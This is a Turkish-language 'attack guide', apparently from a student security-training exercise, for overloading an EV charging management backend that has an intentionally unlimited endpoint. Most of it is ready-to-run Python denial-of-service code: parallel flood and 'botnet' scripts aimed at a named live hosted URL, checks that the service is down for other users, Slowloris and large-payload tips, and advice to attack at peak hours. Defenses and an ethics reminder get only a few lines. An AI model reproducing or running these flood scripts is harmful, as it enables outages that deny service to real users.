# 💥 DDoS Saldırısı (CSMS Overload) - SÜPER DETAYLI SALDIRI REHBERİ

**Senaryo ID:** `ahmet-ddos`  
**Sorumlu:** Ahmet  
**Kategori:** Network/DoS  
**Zayıflık Türü:** No Rate Limiting (İstek Sınırlaması Yok)  
**Şiddet Seviyesi:** 🔴 KRİTİK

---

## 🎯 SALDIRI HEDEFİ

**Amaç:** CSMS (Charge Station Management System) sunucusunu aşırı yük altında bırakarak tüm şarj istasyonlarını erişilemez hale getirmek.

**Gerçek Dünya Etkisi:**
- ⚠️ Binlerce kullanıcı şarj yapamaz
- 💰 Saatlik 50,000+ TL gelir kaybı
- 🚨 Acil durum araçları şarj edemez
- 📰 Medyada yer alır, itibar kaybı

---

## 🔓 SİSTEMDEKİ ZAYIFLIK

### Kod Lokasyonu

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satırlar:** 15-30  
**Fonksiyon:** `ddos_target()`

```python
# ❌ ZAYIFLIK: Rate limiting YOK!
@router.post("/ddos-target")
def ddos_endpoint(requests_count: int = 1):
    results = []
    for i in range(requests_count):  # Sınırsız işlem!
        results.append({"id": i, "processed": True})
    return {"processed": len(results)}
```

### Neden Zayıf?

1. **Rate Limiting Yok** - Saniyede 10,000 istek gönderebilirsiniz
2. **IP Blocking Yok** - Aynı IP'den sürekli istek
3. **CAPTCHA Yok** - Bot tespiti yok
4. **Resource Limit Yok** - CPU %100'e çıkabilir

---

## ⚔️ SALDIRI ADIMLARI

### Adım 1: Hazırlık

```bash
# Python kurulu mu?
python3 --version

# requests kütüphanesini kur
pip3 install requests

# Saldırı klasörü oluştur
mkdir ~/Desktop/AHMET_DDOS_ATTACK
cd ~/Desktop/AHMET_DDOS_ATTACK
```

### Adım 2: Basit Test Saldırısı

**Dosya:** `test_ddos.py`

```python
import requests
import time

BACKEND = "https://evcs-backend-samet.onrender.com"

print("🎯 DDoS Test Saldırısı Başlıyor...\n")

# 10 istek gönder
for i in range(10):
    try:
        response = requests.post(
            f"{BACKEND}/vulnerable/ddos-target",
            json={"requests_count": 100},
            timeout=5
        )
        print(f"✅ İstek {i+1}: {response.status_code} - {response.json()['processed']} işlem")
    except Exception as e:
        print(f"❌ İstek {i+1}: HATA - {e}")
    time.sleep(0.5)

print("\n✅ Test tamamlandı!")
```

**Çalıştır:**
```bash
python3 test_ddos.py
```

**Beklenen Çıktı:**
```
🎯 DDoS Test Saldırısı Başlıyor...

✅ İstek 1: 200 - 100 işlem
✅ İstek 2: 200 - 100 işlem
...
✅ İstek 10: 200 - 100 işlem

✅ Test tamamlandı!
```

---

### Adım 3: GERÇEK SALDIRI - Paralel İstekler

**Dosya:** `massive_ddos.py`

```python
import requests
import threading
import time
from datetime import datetime

BACKEND = "https://evcs-backend-samet.onrender.com"
THREAD_COUNT = 50  # 50 paralel saldırgan
REQUESTS_PER_THREAD = 100  # Her biri 100 istek

success_count = 0
fail_count = 0
start_time = None

def attack_thread(thread_id):
    """Her thread sürekli saldırır"""
    global success_count, fail_count
    
    for i in range(REQUESTS_PER_THREAD):
        try:
            response = requests.post(
                f"{BACKEND}/vulnerable/ddos-target",
                json={"requests_count": 500},
                timeout=2
            )
            
            if response.status_code == 200:
                success_count += 1
                print(f"[Thread-{thread_id:02d}] ✅ İstek {i+1} başarılı")
            else:
                fail_count += 1
                print(f"[Thread-{thread_id:02d}] ⚠️ HTTP {response.status_code}")
                
        except requests.exceptions.Timeout:
            fail_count += 1
            print(f"[Thread-{thread_id:02d}] ⏱️ TIMEOUT - Sunucu cevap veremiyor!")
        except Exception as e:
            fail_count += 1
            print(f"[Thread-{thread_id:02d}] ❌ HATA: {e}")

print(f"""
╔══════════════════════════════════════════╗
║       AHMET'İN DDoS SALDIRISI           ║
║                                          ║
║  Thread Sayısı: {THREAD_COUNT}                      ║
║  Toplam İstek : {THREAD_COUNT * REQUESTS_PER_THREAD}                  ║
║  Hedef        : CSMS Sunucusu            ║
╚══════════════════════════════════════════╝

⚠️  SALDIRI {datetime.now().strftime('%H:%M:%S')} BAŞLADI!
""")

start_time = time.time()
threads = []

# Tüm thread'leri başlat
for i in range(THREAD_COUNT):
    t = threading.Thread(target=attack_thread, args=(i,))
    t.start()
    threads.append(t)
    time.sleep(0.1)  # Thread başlatma gecikmesi

# Tüm thread'lerin bitmesini bekle
for t in threads:
    t.join()

elapsed = time.time() - start_time

print(f"""
\n╔══════════════════════════════════════════╗
║           SALDIRI RAPORU                 ║
╠══════════════════════════════════════════╣
║  Toplam İstek : {success_count + fail_count}                    ║
║  Başarılı     : {success_count}                     ║
║  Başarısız    : {fail_count}                      ║
║  Süre         : {elapsed:.2f} saniye            ║
║  RPS          : {(success_count + fail_count)/elapsed:.1f}                  ║
╚══════════════════════════════════════════╝

🚨 ETKİ ANALİZİ:
""")

if fail_count > success_count:
    print("""
    ✅ SALDIRI BAŞARILI!
    
    Sunucu isteklerin çoğuna cevap veremedi.
    CSMS sistemi ÇÖKTÜ!
    
    🎯 Başarı Göstergeleri:
    - Timeout hataları arttı
    - Response süreleri 5+ saniye
    - Diğer kullanıcılar erişemez
    """)
else:
    print("""
    ⚠️ SALDIRI KISMİ BAŞARILI
    
    Sunucu hala ayakta ama yavaşladı.
    Daha fazla thread veya süre gerekebilir.
    """)
```

**Çalıştır:**
```bash
python3 massive_ddos.py
```

---

### Adım 4: SÜREKLİ SALDIRI (Botnet Simülasyonu)

**Dosya:** `continuous_attack.py`

```python
import requests
import threading
import time

BACKEND = "https://evcs-backend-samet.onrender.com"
ATTACK_DURATION = 300  # 5 dakika

def continuous_bot(bot_id):
    """Her bot sürekli saldırır"""
    end_time = time.time() + ATTACK_DURATION
    request_count = 0
    
    while time.time() < end_time:
        try:
            requests.post(
                f"{BACKEND}/vulnerable/ddos-target",
                json={"requests_count": 1000},
                timeout=1
            )
            request_count += 1
            if request_count % 10 == 0:
                print(f"[Bot-{bot_id:02d}] 💀 {request_count} saldırı gerçekleşti")
        except:
            pass  # Hataları yoksay, saldırıya devam

print("""
╔══════════════════════════════════════════╗
║    SÜREKLİ DDoS SALDIRISI (5 DAKİKA)    ║
╚══════════════════════════════════════════╝

⚠️  CTRL+C ile durdurun
""")

# 30 bot başlat
for i in range(30):
    threading.Thread(target=continuous_bot, args=(i,), daemon=True).start()

try:
    time.sleep(ATTACK_DURATION)
    print("\n✅ 5 dakikalık saldırı tamamlandı!")
except KeyboardInterrupt:
    print("\n⛔ Saldırı durduruldu.")
```

---

## ✅ SALDIRI BAŞARILI MI? KONTROL LİSTESİ

### 1. Sunucu Yanıt Süresi Kontrolü

```python
import requests
import time

BACKEND = "https://evcs-backend-samet.onrender.com"

# Normal endpoint'i test et
start = time.time()
try:
    response = requests.get(f"{BACKEND}/health", timeout=10)
    elapsed = time.time() - start
    
    print(f"Sunucu yanıt süresi: {elapsed:.2f} saniye")
    
    if elapsed > 5:
        print("🚨 BAŞARILI! Sunucu ÇOK YAVAŞ (Normal: <1s)")
    elif elapsed > 2:
        print("⚠️ KISMİ BAŞARILI! Sunucu yavaşladı")
    else:
        print("❌ Başarısız - Sunucu hala hızlı")
        
except requests.exceptions.Timeout:
    print("✅ TAM BAŞARI! Sunucu TIMEOUT - Erişilemez!")
except Exception as e:
    print(f"✅ BAŞARILI! Sunucu hata veriyor: {e}")
```

### 2. Web Arayüzü Kontrolü

1. Tarayıcıda https://simulasyon.vercel.app/ aç
2. Sayfa yüklenmesi 10+ saniye sürüyorsa ✅ BAŞARILI
3. "Loading..." sonsuz dönüyorsa ✅ TAM BAŞARI
4. Connection error alıyorsanız ✅ SUNUCU ÇÖKTÜ

### 3. Log İnceleme

Web arayüzünde:
```
📊 Metrics sekmesi:
- RPS (Request Per Second): 500+ ise ✅
- Latency: 2000+ ms ise ✅
- Error Rate: %50+ ise ✅

📝 Logs sekmesi:
- "WARNING: High traffic detected" ✅
- "CRITICAL: Service unavailable (503)" ✅
- "ERROR: Connection timeout" ✅
```

### 4. Başka Kullanıcı Simülasyonu

**Başka bir terminalde:**
```python
import requests

# Normal kullanıcı gibi API'ye erişmeye çalış
try:
    r = requests.get(
        "https://evcs-backend-samet.onrender.com/scenarios",
        timeout=5
    )
    print("❌ Başarısız - Normal kullanıcılar hala erişebiliyor")
except:
    print("✅ BAŞARILI - Normal kullanıcılar ERİŞEMİYOR!")
```

---

## 🎯 SIZDIĞINIZI NASIL ANLAYACAKSINIZ?

### Başarı Kriterleri (En Az 3 Tanesi Olmalı)

| Kriter | Normal | Saldırı Altında | Durum |
|--------|--------|-----------------|-------|
| API Yanıt Süresi | < 500ms | > 3000ms | ✅ BAŞARI |
| RPS (Request/sec) | < 50 | > 500 | ✅ BAŞARI |
| CPU Kullanımı | %20 | %90+ | ✅ BAŞARI |
| Hata Oranı | < %1 | > %30 | ✅ BAŞARI |
| Timeout Sayısı | 0 | 50+ / dakika | ✅ BAŞARI |
| Kullanıcı Şikayeti | Yok | "Site açılmıyor" | ✅ BAŞARI |

### Terminal Çıktısında Görecekleriniz

**BAŞARILI SALDIRI:**
```
[Thread-01] ⏱️ TIMEOUT - Sunucu cevap veremiyor!
[Thread-05] ⏱️ TIMEOUT - Sunucu cevap veremiyor!
[Thread-12] ❌ HATA: ConnectionError
[Thread-20] ⚠️ HTTP 503 (Service Unavailable)
[Thread-33] ⏱️ TIMEOUT - Sunucu cevap veremiyor!

╔══════════════════════════════════════════╗
║  Başarısız    : 4523                     ║
║  Timeout Rate : %87                      ║
╚══════════════════════════════════════════╝

✅ SALDIRI BAŞARILI!
Sunucu isteklerin çoğuna cevap veremedi.
CSMS sistemi ÇÖKTÜ!
```

**BAŞARISIZ SALDIRI:**
```
[Thread-01] ✅ İstek 100 başarılı
[Thread-05] ✅ İstek 100 başarılı

╔══════════════════════════════════════════╗
║  Başarılı     : 4850                     ║
║  Timeout Rate : %3                       ║
╚══════════════════════════════════════════╝

⚠️ Sunucu hala ayakta
```

---

## 🛡️ SAVUNMA YÖNTEMLERİ (Size Karşı Kullanılacaklar)

### 1. Rate Limiting

```python
from slowapi import Limiter

limiter = Limiter(key_func=get_remote_address)

@router.post("/endpoint")
@limiter.limit("10/minute")  # Dakikada max 10 istek
def protected_endpoint():
    pass
```

**Etki:** Saldırınız dakikada 10 istekle sınırlanır ❌

### 2. IP Blocking

```python
BLOCKED_IPS = set()

@app.middleware("http")
async def block_ips(request, call_next):
    if request.client.host in BLOCKED_IPS:
        return JSONResponse({"error": "Blocked"}, status_code=403)
    return await call_next(request)
```

**Etki:** IP'niz bloklanır, hiç istek gidemez ❌

### 3. CAPTCHA

```python
@router.post("/endpoint")
def with_captcha(captcha_token: str):
    if not verify_captcha(captcha_token):
        raise HTTPException(403, "Invalid CAPTCHA")
```

**Etki:** Bot tespiti devreye girer ❌

---

## 💡 İPUÇLARI ve PÜFNOKTALAR

### ✅ İşe Yarayanlar

1. **Paralel Saldırı:** 50+ thread kullanın
2. **request_count Yüksek:** Her istekte 500-1000 işlem
3. **Süreklilik:** 5-10 dakika boyunca devam edin
4. **Zamanlama:** Yoğun saatlerde (09:00-18:00) daha etkili

### ❌ İşe Yaramayanlar

1. **Tek thread:** Sunucu kolayca karşılar
2. **Düşük request_count:** Etki az
3. **Kısa süreli:** Sunucu hemen toparlanır

### 🎯 PRO İpuçları

**Yöntem 1: Yavaş Saldırı (Slowloris)**
```python
# Her istek 300 saniye beklesin
requests.get(f"{BACKEND}/vulnerable/slow-endpoint?delay=300")
```

**Yöntem 2: Büyük Payload**
```python
# Çok büyük veri gönder
huge_data = {"data": "X" * 1000000}  # 1MB
requests.post(f"{BACKEND}/vulnerable/ddos-target", json=huge_data)
```

---

## ⚠️ ETİK HATIRLAT MA

- ✅ Sadece bu eğitim platformunda kullanın
- ❌ Gerçek sistemlere SALDIRMAYIN
- ⚖️ Yasal sorumluluk size aittir

---

## 📚 Ek Kaynaklar

- [OWASP DDoS](https://owasp.org/www-community/attacks/Denial_of_Service)
- [Rate Limiting Best Practices](https://cloud.google.com/architecture/rate-limiting-strategies)

---

**Hazırlayan:** BSG Team - Ahmet  
**Son Güncelleme:** 2024-12-23  
**Versiyon:** 3.0 - Ultra Detaylı + Sızma Kanıtları
